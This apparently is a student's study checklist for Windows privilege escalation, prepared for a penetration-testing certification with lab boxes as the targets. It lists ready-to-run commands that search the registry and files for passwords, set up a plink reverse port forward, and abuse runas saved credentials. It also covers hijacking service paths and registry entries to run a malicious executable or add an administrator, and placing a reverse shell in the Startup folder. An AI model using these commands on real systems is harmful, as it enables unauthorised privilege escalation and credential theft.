Initial un-managed WPE Checklist: [[PNPT/WPE/Checklist|Checklist]]
[[PNPT/WPE/Resources]]
# Basic Enumeration
---
- **==Look at History==**
- [[PNPT/WPE/Enumeration/System Enumeration|System Enumeration]]: **Good for Kernel Exploitation**
	- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
	- `hostname`
	- `wmic qfe Caption,Description,HotFixID,InstalledOn`
	- `wmic logicaldisk get caption,description,providername` => **==Good One==**
- [[PNPT/WPE/Enumeration/User Enumeration|User Enumeration]]
	- **==`whoami /all`, `whoami /priv, `whoami /groups` `==**
	- `net user`, `net user some_user`
	- **==`net localgroup administrators`, `net localgroup`==**
- [[PNPT/WPE/Enumeration/Network Enumeration|Network Enumeration]] : ==**maybe no need to escalate, just Pivot**==
	- ==**`ipconfig /all`**==
	- ==**`arp -a`**==
	- ==**`route print`**==
	- ==**`netstat -ano`==**
- [[Password Enumeration]]
	- `findstr /si password *.txt *.ini *.config`
	- `unattend.xml`
	- **==`wifi passwords`==**
	- **==Personal powershell script==**
- [[AV and FW Enumeration]]
	- `sc query windefend`**Windows Defender Status**
	- `sc queryex type= service` -> **==All the services==**
	- `netsh firewall show state`, `netsh advfirewall firewall dump`
	- `netsh firewall show config`-> **Open Ports**

# Automated Tools
---
- [[Automation Tools]]
  
# Kernel Exploits
---
https://github.com/SecWiki/windows-kernel-exploits
[[Kernel Exploitation Using Metasploit]]
[[Kernal Exploitation Manually]]
- Might have to run these **multiple times to work** (maybe use different payloads / architecture)
- Good on **==Older versions of windows (7, 8, XP, Servers)==**

# Passwords Escalation and Port Forward
----
[[PNPT/WPE/Escalation via Stored Passwords/Privilege Escalation|Privilege Escalation]]
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
- When **==credentials are found for a user (maybe of ssh?), we can use plink or winEXE or portfwd using meterpreter==** - [[PNPT/WPE/Escalation via Stored Passwords/Privilege Escalation|Privilege Escalation]]
	- `plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.5`

# Windows Subsystem for Linux (WSL)
---
[[PNPT/WPE/Windows Subsystem for Linux/Privilege Escalation|Privilege Escalation]]
- SQL Injection found on Signup Page
- ==`where /R c:\windows wsl.exe`==
- ==`where /R c:\windows bash.exe`==
- `c:\Windows\System32\wsl.exe whoami`
- `c:\Windows\System32\bash.exe`
- `python -c "import pty;pty.spawn('/bin/bash')"`

# ==**Token Impersonation==**
---
[[Token Impersonation Lab]]
[[Potato Attacks Overview]]
[[THM - Tater, Hot Potato]]
**[[Alternate Data Streams]]**

# **==GetSystem==**
----
[[GetSystem]] - SeDebug

# ==**RunAs==** - Similar to sudoers entry
---
[[PNPT/WPE/RunAs/Privilege Escalation|Privilege Escalation]]
- `cmdkey /list`
	- Stored Credentials of `ACCESS\Administrator`
- `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"`
- We **can also** run copy to **copy the file** instead of TYPE
- ==**Search for all the ways to use RunAs**==


# ==Registries==
---
- **Autoruns**
	- [[PNPT/WPE/Autorun/Introduction|Introduction]], [[PNPT/WPE/Autorun/Exploitation|Exploitation]]
	- `Invoke-AllChecks`in PowerUp to detect
- **AlwaysInstallElevated**
	- [[PNPT/WPE/Always Install Elevated/Overview|Overview]], [[PNPT/WPE/Always Install Elevated/Exploitation|Exploitation]]
	- `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
	- `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
		- Should be `0x1`=> **1 means enabled**
	- Download` malicious.msi` file and run it
	- OR `Invoke-AllChecks`
		- `Write-UserAddMSI`
	- OR `exploit/windows/local/always_install_elevated`
- **regsvc ACL** -> Control **over Registries**
	- [[PNPT/WPE/regsvc ACL/Overview|Overview]], [[PNPT/WPE/regsvc ACL/Exploitation|Exploitation]]
	- `powershell.exe -ep bypass`
	- `Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\regsvc" | fl`
		- Look for `NT/INTERACTIVE Allow FullControl`
	- **==We MUST have `NT AUTHORITY/INTERACTIVE` in `whoami /all or a group that has control over over this Registry Service`==** 
	- Upload malicious `x.exe`
	- `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
	- `sc start regsvc`

# ==Service Executable Files==
---
[[PNPT/WPE/Executable Files - Service Escalation/Information|Information]], [[PNPT/WPE/Executable Files - Service Escalation/Exploitation|Exploitation]]
- `FILE_ALL_ACCESS`
- **Detection from `PowerUp.ps1`** and:
	- `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"`
- **Transfer malicious `x.exe`file and `C:\Program Files...\filepermservice.exe` binary**
- `sc start filepermsvc`

# ==Startup Applications==
---
[[PNPT/WPE/Startup Applications/Overview|Overview]], [[PNPT/WPE/Startup Applications/Exploitation|Exploitation]]
- **==Note:- PowerUp.ps1 does not find this
- `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
	- **==We are looking for "BUILTIN\USERS : <\F>", Here "F" means full access.==** 
- **Upload the reverse shell here not add user, as it would require administrator prompt when started**

# DLL Hijacking
---
[[PNPT/WPE/DLL Hijacking/Introduction|Introduction]], [[PNPT/WPE/DLL Hijacking/Exploitation|Exploitation]]
`PowerSploit` and ProcMon
# ==Service Permissions (Paths)==
---
- **Binary Paths**
	[[PNPT/WPE/Binary paths (bin path)/Introduction|Introduction]], [[PNPT/WPE/Binary paths (bin path)/Exploitation|Exploitation]]
	- Detection via `PowerUp.ps1`Or 
		- `accesschk64.exe -uwcv Everyone *`
	- `Everyone`: Group `Everyone`, **because this is our group**
	- `accesschk64.exe -uwcv daclsvc`
	-  Our group `Everyone`can **RW**:
		- ==We should have **SERVICE_CHANGE_CONFIG**==
	- `sc qc daclsvc`
	- `sc config daclsvc binpath= "net localgroup administrators user /add"`
	- `sc start daclsvc`

- **Unquoted Service Paths**
	[[PNPT/WPE/Unquoted Service Paths/Introduction|Introduction]], [[PNPT/WPE/Unquoted Service Paths/Exploitation|Exploitation]]
	[[PNPT/THM Boxes/SteelMountain/Privilege Escalation|Privilege Escalation]]
	- Detection via `PowerUp.ps1`-> `Invoke-AllChecks.ps1`
	- Put a malicious **executable file in any writable path in unquoted service path** 
	- `sc stop unquotedsvc`
	- `sc start unquotedsvc`

# CVE-2019-1388
---
- [[PNPT/WPE/CVE-2019-1388/Privilege Escalation|Privilege Escalation]]
